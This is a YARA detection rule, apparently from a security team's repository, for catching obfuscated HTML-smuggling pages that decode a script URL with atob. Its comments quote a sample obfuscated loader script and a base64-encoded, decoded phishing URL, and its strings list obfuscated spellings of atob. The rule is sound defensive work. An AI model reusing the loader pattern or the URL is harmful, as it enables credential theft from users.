rule Obfuscated_HTML_Smuggling: Mitre_T1027_006 {
    meta:
        tlp = "amber"
        date = "2023-08-15"
        author = "emaiwald"
        description = "More ways to detect obfuscated HTML smuggling, specifically with use of atob b64 function to call and render a webpage or cred harvester in browser"
        platform = "icet"
        scope = "detection"
    file_ext = "htm,html"
    references = "https://ice.info53.com/ace/analysis?alert_uuid=e9cfc552-283f-4e63-b5e2-1d4dc2f196af"

    strings:
    // stupid plus signs to append function names
    $append = /"\+"/ ascii

    /*
    <script>nbDkCt = window;ZXeEpMH=nbDkCt["doc"+"ume"+"nt"]["createE"+"lement"]("scr"+"ipt");
    ZXeEpMH.src=nbDkCt["at"+"ob"]("<BASE64 LINK HERE>");document["bo"+"dy"]["append"+"Child"](ZXeEpMH);</script>
    */

    $s1 = /[A-Za-z]{1,7}=[A-Za-z]{1,7}\["[A-Za-z]{1,}"\+"/ nocase wide ascii
    $s2 = /\.src=[A-Za-z]{1,}\["/ nocase wide ascii

    /*
    base64 = aHR0cHM6Ly9teWVtYWlsc2VydnIuY29tL3dlZWsvYWRtaW4vanMvbXAucGhwP2FyPVpYaGpaV3c9JmI2NGU9bUVKSHFWWSZiNjR1PU5yVVVNdWd2U1ImY29uZj1zcmZXeGZRRW0mY2FsbD1aaEFOaHE=
    decoded = https://myemailservr.com/week/admin/js/mp.php?ar=ZXhjZWw=&b64e=mEJHqVY&b64u=NrUUMugvSR&conf=srfWxfQEm&call=ZhANhq
    */

    $b64_url1 = "http" base64
    $b64_url2 = ".com" base64
    $b64_url3 = ".php" base64

    /* The final way to catch all this is just hit on all the ways to hit on atob lol.
    Thankfully it's just a four char function name.
    */

    $a1 = /"at"\+"ob"/ wide ascii nocase
    $a2 = /"a"\+"tob"/ wide ascii nocase
    $a3 = /"ato"\+"b"/ wide ascii nocase
    $a4 = "atob" wide ascii nocase
    $a5 = "\\x61\\x74\\x6f\\x62" ascii nocase
    $a6 = "\\u0061\\u0074\\u006F\\u0062" ascii nocase


    condition:
    (#append >= 5 and (any of ($a*)) and (any of ($b64_url*))) or
    (
    2 of ($s*) and
    (any of ($b64_url*)) and
    (any of ($a*))
    )

}
